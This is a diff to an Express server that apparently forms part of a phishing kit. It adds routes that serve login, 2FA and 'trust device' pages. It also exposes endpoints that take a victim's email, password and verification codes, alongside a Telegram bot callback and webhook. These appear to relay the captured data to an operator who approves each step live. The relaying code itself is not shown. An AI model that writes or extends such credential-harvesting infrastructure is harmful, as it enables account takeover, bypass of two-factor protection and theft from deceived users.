@@ -17,12 +17,11 @@ if (!botToken || !chatId) {
   console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
 }
 
-// In Vercel serverless environment, long polling is disabled.
 const botOptions = isVercel ? {} : { polling: true };
 const bot = botToken ? new TelegramBot(botToken, botOptions) : null;
 
 app.use(express.json());
-app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname)));
 
 async function handleCallbackQuery(query) {
   if (!query || !bot) return;
@@ -83,7 +82,25 @@ if (!isVercel && bot) {
   bot.on('callback_query', handleCallbackQuery);
 }
 
-app.post('/api/login', async (req, res) => {
+// Page Routes
+app.get(['/', '/index.html'], (_req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get(['/login', '/login.html'], (_req, res) => {
+  res.sendFile(path.join(__dirname, 'login.html'));
+});
+
+app.get(['/2fa', '/2fa.html'], (_req, res) => {
+  res.sendFile(path.join(__dirname, '2fa.html'));
+});
+
+app.get(['/trust-device', '/trust-device.html'], (_req, res) => {
+  res.sendFile(path.join(__dirname, 'trust-device.html'));
+});
+
+// API Routes
+app.post(['/api/login', '/login'], async (req, res) => {
   const email = String(req.body?.email || '').trim();
   const password = String(req.body?.password || '').trim();
 
@@ -120,7 +137,7 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-app.post('/api/telegram', async (req, res) => {
+app.post(['/api/telegram', '/telegram'], async (req, res) => {
   const update = req.body || {};
   if (update.callback_query) {
     try {
@@ -132,7 +149,7 @@ app.post('/api/telegram', async (req, res) => {
   return res.status(200).json({ ok: true });
 });
 
-app.get('/api/set-webhook', async (req, res) => {
+app.get(['/api/set-webhook', '/set-webhook'], async (req, res) => {
   if (!bot || !botToken) {
     return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
   }
@@ -150,7 +167,7 @@ app.get('/api/set-webhook', async (req, res) => {
   }
 });
 
-app.get('/api/login-status', (req, res) => {
+app.get(['/api/login-status', '/login-status'], (req, res) => {
   const email = String(req.query.email || '').trim();
 
   if (!email) {
@@ -166,7 +183,7 @@ app.get('/api/login-status', (req, res) => {
   return res.json({ ok: true, status: decision.status, message: decision.message });
 });
 
-app.post('/api/send-verification', async (req, res) => {
+app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
   const email = String(req.body?.email || '').trim();
   const step = String(req.body?.step || '').trim();
   const code = String(req.body?.code || '').trim();
@@ -202,7 +219,7 @@ app.post('/api/send-verification', async (req, res) => {
   }
 });
 
-app.get('/api/verification-status', (req, res) => {
+app.get(['/api/verification-status', '/verification-status'], (req, res) => {
   const email = String(req.query.email || '').trim();
   const step = String(req.query.step || '').trim();
 
